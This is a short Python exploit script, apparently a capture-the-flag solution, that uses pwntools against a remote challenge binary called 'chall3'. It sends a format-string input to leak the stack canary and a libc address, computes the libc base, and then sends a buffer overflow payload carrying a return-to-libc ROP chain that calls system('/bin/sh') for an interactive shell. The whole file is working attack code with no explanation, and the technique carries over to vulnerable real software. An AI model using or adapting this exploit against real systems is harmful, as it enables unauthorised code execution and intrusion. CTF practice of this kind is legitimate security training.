from pwn import *
import struct

# r = process('./chall3')
r = remote('hack.bckdr.in', 15103)
ret = 0x00000000004007a0
poprdi = 0x0000000000400813

libc = ELF('./chall3 libc.so.6')

libc_system = libc.symbols['system']
libc_exit = libc.symbols['exit']
libc_start_main = libc.symbols['__libc_start_main']

r.recv(1024)
r.sendline('%13$lx.%15$lx.')
d = r.recv(1024)
d = d.split('.')
canary = d[0]
canary = '0x' + canary
canary = int(canary, 16)
start_main_addr = d[1]
start_main_addr = '0x' + start_main_addr
start_main_addr = int(start_main_addr, 16)
libc_base = start_main_addr - 240 - libc_start_main
# libc_base = 0x7ffff7a3a000

system_addr = libc_base + libc_system
exit_addr = libc_base + libc_exit

libc_bin_sh = 0x18cd57
# libc_bin_sh = 0x1b3e9a
bin_sh_addr = libc_base + libc_bin_sh

padding = 'aaaaaaaaaaaaaaaaaaaaaaaa'
exploit = padding + p64(canary) + 'aaaaaaaa' + p64(poprdi) + p64(bin_sh_addr) + p64(ret)+ p64(system_addr)
r.sendline(exploit)
 
r.interactive()